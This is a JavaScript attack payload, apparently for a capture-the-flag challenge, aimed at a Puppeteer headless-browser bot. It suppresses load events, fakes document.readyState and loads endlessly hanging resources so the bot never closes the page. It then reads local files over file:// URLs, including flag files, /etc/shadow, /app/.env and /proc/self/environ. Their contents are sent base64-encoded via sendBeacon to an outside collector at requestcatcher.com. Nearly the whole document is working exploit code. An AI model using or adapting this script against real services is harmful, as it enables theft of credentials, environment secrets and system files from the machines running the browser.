// =================================================================
// ULTIMATE PUPPETEER BYPASS - Block all events that trigger close
// =================================================================

(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    console.log('[INIT] Puppeteer bypass script loaded');
    new Image().src = SERVER + '/init';
    
    // =================================================================
    // BLOCK 1: Intercept ALL page lifecycle events
    // =================================================================
    
    // page.goto() waits for these events (in order):
    // 1. domcontentloaded (default, but can be changed)
    // 2. load (default)
    // 3. networkidle0 (no network activity)
    // 4. networkidle2 (max 2 connections)
    
    const events = [
        'load',
        'DOMContentLoaded', 
        'readystatechange',
        'beforeunload',
        'unload',
        'pagehide',
        'pageshow'
    ];
    
    // Block all events in CAPTURE phase (runs before any other handler)
    events.forEach(function(eventName) {
        window.addEventListener(eventName, function(e) {
            e.stopImmediatePropagation();
            e.preventDefault();
            console.log('[BLOCKED]', eventName);
            new Image().src = SERVER + '/blocked-' + eventName;
            return false;
        }, true); // TRUE = capture phase
        
        // Also block in bubble phase
        window.addEventListener(eventName, function(e) {
            e.stopImmediatePropagation();
            e.preventDefault();
            return false;
        }, false);
    });
    
    // Block document events too
    events.forEach(function(eventName) {
        document.addEventListener(eventName, function(e) {
            e.stopImmediatePropagation();
            e.preventDefault();
            return false;
        }, true);
    });
    
    console.log('[SETUP] All lifecycle events blocked');
    new Image().src = SERVER + '/events-blocked';
    
    // =================================================================
    // BLOCK 2: Override document.readyState
    // =================================================================
    
    // Puppeteer checks document.readyState
    // Keep it in "loading" state forever
    
    try {
        Object.defineProperty(document, 'readyState', {
            get: function() {
                return 'loading'; // Always return "loading"
            },
            configurable: true
        });
        console.log('[OVERRIDE] document.readyState = loading (forever)');
        new Image().src = SERVER + '/readystate-overridden';
    } catch(e) {
        console.log('[ERROR] Cannot override readyState:', e.message);
    }
    
    // =================================================================
    // BLOCK 3: Add infinite loading resources
    // =================================================================
    
    function addHangingResources() {
        // These resources will NEVER finish loading
        // This keeps networkidle0 and networkidle2 from triggering
        
        const resources = [
            // Hanging iframes
            { tag: 'iframe', attr: 'src', url: 'https://httpstat.us/200?sleep=999999&t=if1' },
            { tag: 'iframe', attr: 'src', url: 'https://httpstat.us/200?sleep=999999&t=if2' },
            
            // Hanging scripts
            { tag: 'script', attr: 'src', url: 'https://httpstat.us/200?sleep=999999&t=js1' },
            { tag: 'script', attr: 'src', url: 'https://httpstat.us/200?sleep=999999&t=js2' },
            
            // Hanging images
            { tag: 'img', attr: 'src', url: 'https://httpstat.us/200?sleep=999999&t=img1' },
            { tag: 'img', attr: 'src', url: 'https://httpstat.us/200?sleep=999999&t=img2' },
            
            // Hanging stylesheets
            { tag: 'link', attr: 'href', url: 'https://httpstat.us/200?sleep=999999&t=css1', rel: 'stylesheet' },
            
            // Hanging XHR (keeps network active)
            { tag: 'img', attr: 'src', url: 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7' }
        ];
        
        resources.forEach(function(res, idx) {
            setTimeout(function() {
                const el = document.createElement(res.tag);
                el[res.attr] = res.url;
                if (res.rel) el.rel = res.rel;
                el.style.display = 'none';
                
                // Add to head or body
                const target = document.head || document.body || document.documentElement;
                target.appendChild(el);
                
                console.log('[RESOURCE] Added hanging', res.tag, idx);
            }, idx * 50);
        });
        
        // Start infinite XHR requests to keep network busy
        setInterval(function() {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://httpstat.us/200?sleep=10000&t=' + Date.now(), true);
            xhr.send();
        }, 5000);
        
        console.log('[RESOURCES] Infinite loading resources added');
        new Image().src = SERVER + '/resources-added';
    }
    
    // Add resources immediately if DOM is ready
    if (document.body) {
        addHangingResources();
    } else {
        // Wait for body to exist
        const observer = new MutationObserver(function() {
            if (document.body) {
                addHangingResources();
                observer.disconnect();
            }
        });
        observer.observe(document.documentElement, { childList: true, subtree: true });
    }
    
    // =================================================================
    // BLOCK 4: Override window.stop() and window.close()
    // =================================================================
    
    window.stop = function() {
        console.log('[BLOCKED] window.stop() called');
        new Image().src = SERVER + '/stop-blocked';
        // Don't actually stop
    };
    
    window.close = function() {
        console.log('[BLOCKED] window.close() called');
        new Image().src = SERVER + '/close-blocked';
        // Don't actually close
        return false;
    };
    
    // =================================================================
    // BLOCK 5: Prevent Navigation
    // =================================================================
    
    // Override window.location to prevent redirects (if needed)
    const originalLocation = window.location;
    
    // =================================================================
    // BLOCK 6: File Exfiltration (now we have unlimited time)
    // =================================================================
    
    function exfiltrate() {
        new Image().src = SERVER + '/exfil-start';
        console.log('[EXFIL] Starting file exfiltration');
        
        const results = {};
        
        function readFileSync(path, name) {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', path, false); // SYNCHRONOUS
                xhr.send();
                
                if ((xhr.status === 200 || xhr.status === 0) && xhr.responseText) {
                    console.log('[SUCCESS] Read', name, xhr.responseText.length, 'bytes');
                    
                    // Store result
                    results[name] = xhr.responseText;
                    
                    // Send immediately via beacon
                    const fd = new FormData();
                    fd.append('name', name);
                    fd.append('data', btoa(xhr.responseText.substring(0, 3000)));
                    navigator.sendBeacon(SERVER + '/file-' + name, fd);
                    
                    // Also send via image
                    new Image().src = SERVER + '/got-' + name;
                    
                    return true;
                }
            } catch(e) {
                console.log('[ERROR] Reading', name, ':', e.message);
                new Image().src = SERVER + '/error-' + name + '?msg=' + encodeURIComponent(e.message);
            }
            return false;
        }
        
        // Target files (prioritized)
        const files = [
            // Flags first (highest priority)
            ['file:///flag.txt', 'flag'],
            ['file:///app/flag.txt', 'appflag'],
            ['file:///home/flag.txt', 'homeflag'],
            ['file:///root/flag.txt', 'rootflag'],
            ['file:///tmp/flag.txt', 'tmpflag'],
            
            // System info
            ['file:///etc/passwd', 'passwd'],
            ['file:///etc/hostname', 'hostname'],
            ['file:///etc/hosts', 'hosts'],
            ['file:///etc/shadow', 'shadow'],
            
            // App files
            ['file:///app/bot.js', 'bot'],
            ['file:///app/package.json', 'package'],
            ['file:///app/app.js', 'app'],
            ['file:///app/index.js', 'index'],
            ['file:///app/.env', 'env'],
            
            // Proc filesystem
            ['file:///proc/self/environ', 'environ'],
            ['file:///proc/self/cmdline', 'cmdline'],
            ['file:///proc/version', 'version']
        ];
        
        let successCount = 0;
        
        // Read all files synchronously
        files.forEach(function(item) {
            if (readFileSync(item[0], item[1])) {
                successCount++;
            }
        });
        
        // Send summary
        console.log('[EXFIL] Complete:', successCount, '/', files.length, 'files');
        new Image().src = SERVER + '/exfil-done?success=' + successCount + '&total=' + files.length;
        
        // Send all results as one payload
        try {
            const payload = btoa(JSON.stringify(results));
            const fd = new FormData();
            fd.append('all', payload);
            navigator.sendBeacon(SERVER + '/all-files', fd);
        } catch(e) {
            console.log('[ERROR] Sending all files:', e.message);
        }
        
        return results;
    }
    
    // Start exfiltration after a short delay
    setTimeout(function() {
        exfiltrate();
    }, 200);
    
    // =================================================================
    // BLOCK 7: Heartbeat to prove bot is alive
    // =================================================================
    
    let heartbeat = 0;
    const heartbeatInterval = setInterval(function() {
        heartbeat++;
        new Image().src = SERVER + '/heartbeat?n=' + heartbeat;
        console.log('[HEARTBEAT]', heartbeat, '- Bot still alive, waiting forever...');
        
        // Re-add hanging resources periodically
        if (heartbeat % 5 === 0) {
            const img = new Image();
            img.src = 'https://httpstat.us/200?sleep=999999&t=' + Date.now();
            document.body.appendChild(img);
        }
    }, 2000);
    
    // =================================================================
    // BLOCK 8: Monkey-patch XMLHttpRequest to stay active
    // =================================================================
    
    // Keep making requests to maintain network activity
    function keepNetworkActive() {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://httpstat.us/200?sleep=30000&t=' + Date.now(), true);
        xhr.send();
        
        setTimeout(keepNetworkActive, 25000); // Start next before current finishes
    }
    
    setTimeout(keepNetworkActive, 1000);
    
    // =================================================================
    // BLOCK 9: Override Performance Navigation Timing
    // =================================================================
    
    // Puppeteer might check performance.timing
    try {
        if (window.performance && window.performance.timing) {
            const timing = window.performance.timing;
            Object.defineProperty(timing, 'loadEventEnd', {
                get: function() { return 0; }, // Never loaded
                configurable: true
            });
            Object.defineProperty(timing, 'loadEventStart', {
                get: function() { return 0; },
                configurable: true
            });
        }
    } catch(e) {}
    
    // =================================================================
    // Final Status
    // =================================================================
    
    console.log('[READY] Puppeteer bypass complete');
    console.log('[READY] Bot will wait indefinitely');
    console.log('[READY] All events blocked, infinite resources loading');
    
    new Image().src = SERVER + '/bypass-complete';
    
})();
